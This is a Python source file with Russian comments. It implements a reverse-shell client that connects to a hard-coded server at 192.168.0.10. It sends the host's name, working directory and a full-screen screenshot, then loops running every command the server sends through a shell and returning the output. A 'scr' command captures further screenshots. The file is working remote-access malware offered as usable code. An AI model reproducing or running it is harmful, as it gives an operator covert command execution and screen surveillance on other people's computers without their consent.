import os
import subprocess
import sys
import time

from mss import mss
# TODO сделать импорт для других операционных + в make_screenshot сделать переход в temp OS
from SOCKETv4_TCP import Socket, SocketErrors

custom_commands = ('scr',)


def try_to_connect(times: int):
    """ Декоратор для выставления кол-во попыток для подключения

    :param times: количество попыток подключения.
    """
    times = 5 if times <= 0 else times

    def decorator(func):
        def wrapper(*args):
            for _ in range(times):
                try:
                    func(*args)
                except SocketErrors as Exc:
                    print('Ошибка подключения!', Exc)
                    time.sleep(2)

        return wrapper

    return decorator


def make_screenshot() -> bytes:
    """ Делает и сохраняет скриншот экрана во временном месте. Конвертирует в байты и возвращает их.

    :return: bytes
    """
    with mss() as sc:
        cwd = os.getcwd()

        try:
            os.chdir(r'C:\Temp')
        except OSError:
            pass

        sc.shot(mon=-1, output='928037453925847.png')

    with open('928037453925847.png', 'rb') as scr_reader:
        data = scr_reader.read()

    os.remove('928037453925847.png')
    os.chdir(cwd)

    return data


class Client(Socket):
    """
    Класс клиента. Работает с подключением и отправкой нужных данных.

    Python ver. = 3.9
    """

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

    @try_to_connect(times=4)
    def startClient(self) -> None:
        """ Запускает клиента, подключается к сокету.

        :return:
        """
        self.connect()
        os.chdir('C:\\')
        cwd = os.getcwd()

        self.sendall(f'{self._hostname}{self.sep}{cwd}')
        self.recvCommands()

    def recvCommands(self) -> None:
        """ Принимает, обрабатывает, отправляет обратно команды в цикле.

        :return: None
        """
        screenshot_data = make_screenshot()
        self.sendall(screenshot_data)
        while True:
            command = self.recv()
            if not command:
                sys.exit()

            output = self.handlerCommand(command)

            if output == 'continue':
                continue

            cwd = os.getcwd()
            message = f'{output}{self.sep}{cwd}'
            self.sendall(message)

    @staticmethod
    def _system_command(command) -> str:
        """ Обрабатывает системные команды.

        :param command: команда
        :return: str
        """
        split_command = command.split()
        if split_command[0].lower() == 'cd':
            try:
                os.chdir(' '.join(split_command[1:]))
            except FileNotFoundError as Exc:
                output = str(Exc)
            else:
                output = str()
        else:
            output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            output = output.stdout.read().decode('cp866')

        return output

    def handlerCommand(self, command) -> str:
        """ Отлавливает кастомные команды от сервера.

        :param command: команда
        :return: str
        """
        if command in custom_commands:
            if command.lower() == 'scr':
                screenshot_data = make_screenshot()
                self.sendall(screenshot_data)
                output = 'continue'
        else:
            output = self._system_command(command)

        return output


if __name__ == '__main__':
    server = Client(addr='192.168.0.10', port=13445)
    server.startClient()
